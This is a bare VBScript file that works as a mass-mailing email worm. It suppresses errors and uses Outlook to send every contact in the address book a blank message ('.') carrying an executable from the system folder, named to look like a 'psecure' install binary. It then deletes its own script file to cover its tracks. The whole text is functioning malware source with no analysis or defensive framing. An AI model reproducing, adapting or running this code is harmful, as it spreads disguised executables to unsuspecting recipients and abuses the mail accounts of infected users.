On Error Resume Next
Dim oFileSystemObject, sScript, sSystem, iIndex
Set oFileSystemObject = CreateObject("Scripting.FileSystemObject")
sScript = WScript.ScriptFullName
sSystem = oFileSystemObject.GetSpecialFolder(1)
Set oOutLook = CreateObject("Outlook.Application")
For iIndex = 1 To oOutLook.GetNameSpace("MAPI").AddressLists(1).AddressEntries.Count
Set mMail = oOutLook.CreateItem(0)
mMail.To = oOutLook.GetNameSpace("MAPI").AddressLists(1).AddressEntries(iIndex)
mMail.Subject = "."
mMail.Body = "."
mMail.Attachments.Add(sSystem & "\psecure20x-cgi-install.version6.01.bin.hx.com")
mMail.Send
Next
oOutLook.Quit
oFileSystemObject.DeleteFile(sScript)
